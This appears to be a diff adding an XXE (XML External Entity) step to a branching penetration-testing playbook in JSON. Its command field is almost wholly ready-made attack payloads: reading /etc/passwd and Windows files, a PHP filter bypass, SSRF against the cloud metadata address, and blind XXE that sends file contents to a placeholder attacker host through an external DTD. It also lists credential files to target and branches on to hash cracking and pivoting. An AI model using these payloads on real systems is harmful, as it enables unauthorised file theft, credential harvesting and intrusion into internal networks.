@@ -1,0 +1,26 @@
+{
+  "id": "xxe",
+  "phase": "WEB",
+  "title": "XXE — XML External Entity",
+  "body": "XXE = make the server read local files or trigger internal HTTP requests via XML. Find any endpoint that accepts XML (SOAP, REST with XML body, file upload of SVG/DOCX/XML). Blind XXE needs out-of-band — use Burp Collaborator or interactsh.",
+  "cmd": "# Detect XML endpoints\n# Look for: Content-Type: application/xml, text/xml, application/soap+xml\n# File uploads: .xml, .svg, .docx, .xlsx (all use XML internally)\n# API bodies containing XML\n\n# Basic file read (direct output)\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n\n# Windows file read\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"> ]>\n<root><data>&xxe;</data></root>\n\n# PHP wrapper — base64 encode to bypass filters\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n# Decode: echo \"BASE64\" | base64 -d\n\n# SSRF via XXE — probe internal network\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> ]>\n<root><data>&xxe;</data></root>\n\n# Blind XXE — out-of-band DNS detection\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://COLLABORATOR.burpcollaborator.net/xxe\">\n  %xxe;\n]>\n<root/>\n\n# Blind XXE with data exfil (evil.dtd on your server)\n# evil.dtd content:\n# <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n# <!ENTITY % wrap \"<!ENTITY &#37; send SYSTEM 'http://ATTACKER/?d=%file;'>\">\n# %wrap; %send;\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$lhost/evil.dtd\">\n  %dtd;\n]>\n<root/>\n\n# SVG upload XXE\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n  <text>&xxe;</text>\n</svg>\n\n# Quick file targets\n# Linux: /etc/passwd /etc/shadow /proc/self/environ /var/www/html/config.php\n# Windows: C:\\Windows\\win.ini C:\\inetpub\\wwwroot\\web.config",
+  "warn": "If output is empty but no error, assume blind XXE — switch to out-of-band. PHP filter wrapper works even when direct SYSTEM entity is blocked.",
+  "choices": [
+    {
+      "label": "Got file read — found creds in config",
+      "next": "creds_found"
+    },
+    {
+      "label": "SSRF — pivoting to internal services",
+      "next": "ssrf"
+    },
+    {
+      "label": "Blind XXE confirmed — need more enumeration",
+      "next": "web_fuzz_deep"
+    },
+    {
+      "label": "Got /etc/passwd — crack hashes",
+      "next": "hashcrack"
+    }
+  ]
+}
